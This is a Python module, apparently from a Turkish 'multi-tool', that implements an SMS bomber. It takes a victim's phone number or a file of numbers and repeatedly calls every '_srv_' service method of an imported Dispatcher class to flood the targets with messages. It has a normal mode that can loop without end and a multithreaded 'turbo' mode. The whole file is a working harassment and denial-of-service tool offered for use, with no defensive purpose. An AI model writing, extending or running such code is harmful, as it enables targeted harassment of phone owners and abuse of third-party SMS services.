"""
sms_bomber.py — SMS Bomber modülü
NexaVista Multi-Tool entegrasyonu
"""
import threading
from time import sleep
from os import system

from faker import Faker
import random

from core import clr


def _generate_users(count: int) -> list[dict]:
    """Rastgele kullanıcı bilgisi üretir."""
    locales = ['tr_TR', 'en_US']
    users = []
    for _ in range(count):
        fake = Faker(random.choice(locales))
        users.append({
            "first_name": fake.first_name(),
            "last_name": fake.last_name(),
            "username": fake.user_name(),
            "password": fake.password()
        })
    return users


def _get_service_list(sms_cls):
    """Dispatcher sınıfından servis fonksiyonlarını çeker."""
    services = []
    # Sadece _srv_ ile başlayan gizli servis metodlarını çek
    for attr_name in dir(sms_cls):
        if attr_name.startswith('_srv_'):
            attr = getattr(sms_cls, attr_name)
            if callable(attr):
                services.append(attr_name)
    return services


def run_sms():
    """Menüden çağrılan SMS Bomber fonksiyonu."""
    # Lazy import — services.py aynı klasörde
    from modules.sms.services import Dispatcher

    servisler = _get_service_list(Dispatcher)

    print(rf"""{clr.am9}╠═════════════════════════════════════╗
{clr.am5}║          SMS Bomber                 ║
{clr.am9}╠═════════════════════════════════════╣
{clr.am6}║  {clr.d}Toplam {len(servisler)} servis aktif{clr.r}
{clr.am6}║
{clr.am6}║  {clr.am3}[1]{clr.r} SMS Gönder (Normal)
{clr.am6}║  {clr.am3}[2]{clr.r} SMS Gönder (Turbo)
{clr.am6}║  {clr.d}[0]{clr.r} Geri Dön""")

    secim = input(f"{clr.am7}╠═══════ > Seçim: {clr.r}").strip()

    if secim == "0" or not secim:
        return

    # ── Telefon numarası ──
    tel_no = input(f"{clr.am7}╠═══════ > Telefon (+90 olmadan, 10 hane): {clr.r}").strip()
    tel_liste = []

    if tel_no == "":
        dosya = input(f"{clr.am7}╠═══════ > Numara dosyası yolu: {clr.r}").strip()
        try:
            with open(dosya, "r", encoding="utf-8") as f:
                for line in f.read().strip().split("\n"):
                    line = line.strip()
                    if len(line) == 10 and line.isdigit():
                        tel_liste.append(line)
            if not tel_liste:
                print(f"{clr.k}  Dosyada geçerli numara bulunamadı.{clr.r}")
                return
            print(f"{clr.am6}║  {clr.y}✔ {len(tel_liste)} numara dosyadan yüklendi.{clr.r}")
        except FileNotFoundError:
            print(f"{clr.k}  Dosya bulunamadı.{clr.r}")
            return
    else:
        if not tel_no.isdigit() or len(tel_no) != 10:
            print(f"{clr.k}  Hatalı telefon numarası (10 hane olmalı).{clr.r}")
            return
        tel_liste.append(tel_no)

    # ── Mail adresi ──
    mail = input(f"{clr.am7}╠═══════ > Mail adresi (opsiyonel, Enter = atla): {clr.r}").strip()
    if mail and ("@" not in mail or "." not in mail):
        print(f"{clr.k}  Hatalı mail formatı.{clr.r}")
        return

    # ── Normal Mod ──
    if secim == "1":
        kere_input = input(f"{clr.am7}╠═══════ > Kaç SMS (Enter = sonsuz): {clr.r}").strip()
        kere = int(kere_input) if kere_input.isdigit() else None

        aralik_input = input(f"{clr.am7}╠═══════ > Aralık (saniye) [1]: {clr.r}").strip()
        aralik = int(aralik_input) if aralik_input.isdigit() else 1

        print(f"{clr.am6}║  {clr.y}► Başlatılıyor... Ctrl+C ile durdurabilirsiniz.{clr.r}")

        try:
            for numara in tel_liste:
                sms = Dispatcher(numara, mail)
                if kere is None:
                    while True:
                        for servis in servisler:
                            getattr(sms, servis)()
                            sleep(aralik)
                else:
                    while sms.adet < kere:
                        for servis in servisler:
                            if sms.adet >= kere:
                                break
                            getattr(sms, servis)()
                            sleep(aralik)
        except KeyboardInterrupt:
            print(f"\n{clr.am6}║  {clr.s}⚠ Durduruldu.{clr.r}")

    # ── Turbo Mod ──
    elif secim == "2":
        if not tel_liste:
            return

        from concurrent.futures import ThreadPoolExecutor
        numara = tel_liste[0]
        send_sms = Dispatcher(numara, mail)
        stop = threading.Event()

        def turbo():
            # max_workers=20 to prevent DNS resolution timeouts and network congestion
            max_workers = 20
            while not stop.is_set():
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    for fonk in servisler:
                        if stop.is_set():
                            break
                        executor.submit(getattr(send_sms, fonk))
                        # Increased staggered delay to further ease DNS lookups
                        sleep(0.15)
                # Brief pause between rounds
                sleep(0.5)

        print(f"{clr.am6}║  {clr.y}► TURBO mod başlatılıyor... Ctrl+C ile durdurabilirsiniz.{clr.r}")
        try:
            turbo()
        except KeyboardInterrupt:
            stop.set()
            print(f"\n{clr.am6}║  {clr.s}⚠ Turbo durduruldu.{clr.r}")
    
    import sys
    print(f"\n{clr.am6}║  {clr.y}✔ SMS Gönderimi tamamlandı. Çıkış yapılıyor...{clr.r}")
    sys.exit(0)


